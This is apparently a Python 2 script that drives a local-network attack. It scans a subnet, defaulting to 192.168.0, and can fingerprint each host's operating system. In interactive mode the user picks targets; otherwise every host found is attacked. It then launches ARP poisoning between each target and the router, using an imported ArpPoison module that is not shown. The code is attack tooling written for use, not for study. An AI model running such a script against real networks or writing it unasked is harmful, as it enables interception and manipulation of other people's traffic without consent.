from ipScanner import IpScanner
from arpPoison import ArpPoison
import sys
import threading

def main():
    print 'by default the scanner will scan 192.168.0'
    args = sys.argv
    interactive = False
    ip = ''
    if '-i' in args:
        interactive = True;
        args.remove('-i')
    scanner = None

    routerIP = args[1]

    try:
        ip = args[2]
        scanner = IpScanner(ip)
    except:
        scanner = IpScanner()
    targetlist = scanner.scan()

    attacklist = []
    #who to target?
    if interactive:
        while True:
            if targetlist == []:
                print 'target list empty'
                break

            print 'get the os for the specified IP addresse, write next to go to next step.'
            print targetlist
            ip = raw_input()
            if ip == 'next':
                break
            else:
                attackOS = scanner.getOsForIp(ip)
                print attackOS

            print 'do you want to add this to the attack list? (y/n)'
            answer = raw_input()
            if answer == 'y' or answer =='yes':
                attacklist.append(ip)
                targetlist.remove(ip)


    #peut faire la meme chose pour le hostname mais sa ne me retourne jamais rien de bon
    else:
        attacklist = targetlist
        #iteraction avec usager pour les target
    print attacklist

    stopList = []
    for i in attacklist:
        ArpPoison(routerIP, i)

    while True:
        answer = raw_input()
        if answer == 'stop':
            break

if __name__ == "__main__":
    main()